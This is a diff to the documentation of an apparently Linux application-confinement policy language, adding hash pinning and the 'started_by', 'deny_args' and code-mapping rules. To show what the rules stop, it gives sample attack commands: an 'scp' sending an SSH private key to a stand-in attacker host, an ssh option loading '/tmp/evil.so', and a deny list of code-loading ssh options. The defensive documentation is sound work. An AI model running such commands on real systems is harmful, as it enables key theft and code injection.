@@ -39,16 +39,19 @@ An application: what identifies it (`exe`) and the data it owns (`owns`).
 | `mode audit` / `mode enforce` | `audit` (the default) allows every access and logs the ones the policy does not allow. `enforce` denies them with `EACCES`. |
 | `inherit` | Processes of the app keep its identity when they execute an exe that belongs to no app. See [`inherit`](#inherit). |
 | `env "NAME=VALUE", …` | Loader variables the app may be started with. See [`env`](#env-namevalue-). |
+| `started_by APP, @terminal, …` | Who may start the app. See [`started_by`](#started_by-app-). |
+| `deny_args "ARG", …` | Arguments the app may not be started with. See [`deny_args`](#deny_args-arg-). |
+| `code trusted` / `code any` | Which files the app may map as code. See [`code`](#code-trustedany). |
 
 App names are words of letters, digits, `_`, `-` and `.`. `unconfined`,
-`all`, `terminal`, `root`, `unknown`, `explsm-agent`, `explsmd` and
+`all`, `terminal`, `desktop`, `root`, `unknown`, `explsm-agent`, `explsmd` and
 `explsm-pins` are reserved. At most 251 different app names can be used until explsm is
 unloaded: ids are not reused, because running processes keep theirs, and
 they are kept across daemon restarts in `/var/lib/explsm/ids`.
 
 The kernel's maps hold at most 4096 grants (one per subject and owner), 256
 `env` strings, 1021 exes, 65536 owned files and folders (with the files that
-have more than one hard link inside them) and 256 terminal exes. The
+have more than one hard link inside them) and 256 `terminal`, `shell` and `desktop` exes. The
 compiler refuses a policy over a limit it can count (grants, `env` strings,
 absolute paths without a glob); what globs and `~/` paths resolve to is
 checked when the daemon applies the policy, which then keeps the old one.
@@ -58,6 +61,41 @@ by group or others, or in such a directory) is protected like the app's data:
 anyone may run it, only the app may change, move or remove it, and only the
 app may add files to its directory, so nothing can be planted for a glob such
 as `~/.local/share/claude/versions/*`.
+
+Root-owned exes (`/usr/bin/…`) are trusted as they are: only root can
+change them. `explsmctl status` notes each exe as `protected
+(user-writable)` or `trusted: only root can change it`.
+
+#### Pinned hashes
+
+An `exe` path may be followed by `sha256 "HEX"` and `hashes "FILE"`, each
+any number of times:
+
+```
+app claude {
+    exe "~/.local/share/claude/versions/*" hashes "/etc/explsm/claude.sha256",
+        "/usr/local/bin/tool" sha256 "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
+    owns "~/.claude"
+}
+```
+
+- `sha256` is 64 hex digits, as `sha256sum` prints them.
+- `hashes` is an absolute path to a list in `sha256sum` format. Root must
+  own it and the directories above it, and they must not be writable by
+  group or others, as for [`env`](#env-namevalue-) paths: otherwise the
+  policy is refused.
+- A file that the path or glob matches but that has none of the hashes is
+  refused: it is not the app's exe. explsmd warns `exe PATH of APP has none
+  of its pinned hashes; it is no app`, `explsmctl check --resolve` lists it
+  as `refused exe PATH (none of its pinned hashes)`, and `explsmctl status`
+  adds `, hash pinned` to pinned exes.
+
+This closes trust on first use for a path or glob that matches nothing
+yet: whatever appears there first is no app unless it has a listed hash.
+The daemon checks the hash when it resolves the path, so a file changed
+between the hash and the guard taking hold is a short race. An app that
+updates itself needs root to add the hash of each new version; updates are
+not checked by signature yet.
 
 `exe "…" script "…"` (interpreter identity, e.g. `node …/cli.js`) is
 reserved and reported as not supported yet.
@@ -113,6 +151,112 @@ env "LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libxkbcommon.so.0"
   it, and they must not be writable by group or others: otherwise loading
   the policy fails, since a user could put their own library there.
 - Any other loader variable next to an allowed one still drops the identity.
+
+#### `started_by APP, …`
+
+Malware need not get into an app; it can run the real one with its own
+arguments (`scp ~/.ssh/id_ed25519 attacker:`). `started_by` lists who may
+start the app, in any mix:
+
+- an app: a process of that app;
+- `@terminal`: a process in a chain of shells started by a terminal (see
+  [`shell`](#shell-path-)), i.e. a command typed in a terminal;
+- `@desktop`: the desktop shell (see [`desktop`](#desktop-path-)), i.e.
+  the app was started from a menu or dock;
+- `@unconfined`: anyone. A warning, since it checks nothing.
+
+```
+terminal "/usr/bin/ptyxis"
+shell    "/usr/bin/bash", "/usr/bin/zsh"
+
+app ssh {
+    exe  "/usr/bin/ssh", "/usr/bin/scp"
+    started_by @terminal, git
+    mode enforce
+}
+```
+
+At exec, the process gets the app's identity only if what it was just
+before the exec matches: the app it was, or the app of the process that
+forked it. That is recorded in task storage at fork, so a process
+re-parented to `systemd --user` keeps what started it. Otherwise it runs as
+no app, and is never given the identity later, at startup or when exes are
+added. In enforce mode it is dropped; in audit mode it is only reported and
+keeps the identity:
+
+```
+deny   pid=4245 … app=ssh exe=/usr/bin/scp dropped=started_by spawner=unconfined
+```
+
+`spawner` is the app (or `unconfined`), with `(terminal)` or `(desktop)`
+after it when the process had that flag. An exec that keeps the identity
+(an app's process executing the app's exe again) is not checked.
+
+- Naming the app itself, or an unknown `@…`, is an error.
+- Naming an app whose exe is a launcher that starts programs for anyone
+  (`systemd`, `systemd-run`, `dbus-daemon`, `dbus-broker`, `gnome-session`,
+  `gnome-session-binary`, `gnome-terminal-server`, `xdg-open`, `gio`,
+  `gio-launch-desktop`) is a warning.
+- `@terminal` without any `terminal` exe or without any `shell` exe is a
+  warning, and so is `@desktop` without a `desktop` exe.
+
+What it doesn't do:
+
+- A wrapper between the shell and the app (`env`, `sudo`, `nice`, `time`)
+  ends the chain of shells, unless it is listed as a `shell`.
+- `@terminal` stops background malware, not a script the user ran in that
+  terminal. An `npm install` postinstall script is cut off, because `node`
+  is no shell; `bash evil.sh` typed by the user is a shell.
+- Processes running when explsmd starts are not in a chain of shells (only
+  the terminal flag is given to them). Open a new shell.
+- `gnome-terminal-server` opens a terminal for any caller, like any
+  terminal emulator started with a command (see
+  [`terminal`](#terminal-path-)).
+
+#### `deny_args "ARG", …`
+
+Arguments that drop the identity: an argument equal to a pattern, or
+starting with a pattern that ends in `*`. Each argument of the exec is
+compared on its own. Enforce and audit mode as for `started_by`; logged as
+`dropped=deny_args`.
+
+```
+app ssh {
+    exe "/usr/bin/ssh", "/usr/bin/scp"
+    deny_args "-I", "-F", "-oPKCS11Provider*", "PKCS11Provider*"
+}
+```
+
+- `*` is only allowed at the end; there are no other globs.
+- At most 126 bytes a pattern, and 256 patterns in all apps.
+
+This is a backstop, and easy to get around: another spelling (case,
+`-o PKCS11Provider=…` as two arguments, which is why `PKCS11Provider*` is
+listed for the second word), or a config file (`-F`, `~/.ssh/config`). Use
+it only for known options that load code or redirect the app.
+
+#### `code trusted|any`
+
+`code trusted` (the default): a process of the app may map a file as code
+(`mmap` or `mprotect` with `PROT_EXEC`) only if root alone can change the
+file, or the file belongs to the app (its exe or its owned data). Root
+alone can change a file owned by uid 0, not writable by group or others,
+and not on FUSE (where the mounter decides the owner). Only the file itself
+is checked, not the directories above it. Anonymous executable memory (JITs)
+is left alone. In enforce mode the map fails with `EACCES`; in audit mode it
+is reported:
+
+```
+deny   … subject=coder owner=unconfined mmap need=code /var/tmp/x/user.so
+```
+
+This stops `ssh -o PKCS11Provider=/tmp/evil.so` (and `SecurityKeyProvider`),
+and Python or Node native modules from a user-writable path. It also backs
+up the `LD_PRELOAD` check. `code any` turns it off, for apps that load
+plugins from the user's folders.
+
+`explsmctl status` and `check` show `code any`, `started_by …` and
+`deny_args …` for each app that has them.
 
 #### Loader variables
 
@@ -200,6 +344,25 @@ terminal emulator with a command of its choice (`konsole -e cat …`). Prefer
 prompts or app grants for sensitive data. Processes that were running below a
 terminal when the daemon started get the flag too. A terminal removed from
 the policy keeps its running processes trusted until they exit.
+
+### `shell "PATH", …`
+
+Shells: `/usr/bin/bash`, `/usr/bin/zsh`. A `terminal` exe starts a chain of
+shells; an exec of a `shell` exe keeps it, an exec of anything else ends it.
+`started_by @terminal` checks for it:
+
+```
+terminal "/usr/bin/ptyxis"
+shell    "/usr/bin/bash", "/usr/bin/zsh", "/usr/bin/fish"
+```
+
+### `desktop "PATH", …`
+
+The desktop shell, e.g. `/usr/bin/gnome-shell`. Its processes are the
+desktop until their next exec, so a program it starts from a menu or dock
+is `started_by @desktop`.
+
+`terminal`, `shell` and `desktop` exes share one map of 256.
 
 ### `claim APP "PATH", …`
 
